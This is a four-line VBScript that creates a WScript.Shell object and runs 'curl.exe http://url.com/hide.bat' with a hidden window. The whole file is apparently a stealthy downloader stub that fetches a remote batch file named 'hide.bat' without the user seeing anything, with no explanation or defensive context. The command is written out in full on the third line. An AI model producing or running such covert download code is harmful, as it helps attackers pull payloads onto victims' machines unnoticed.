Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "curl.exe http://url.com/hide.bat", 0
Set WShell = Nothing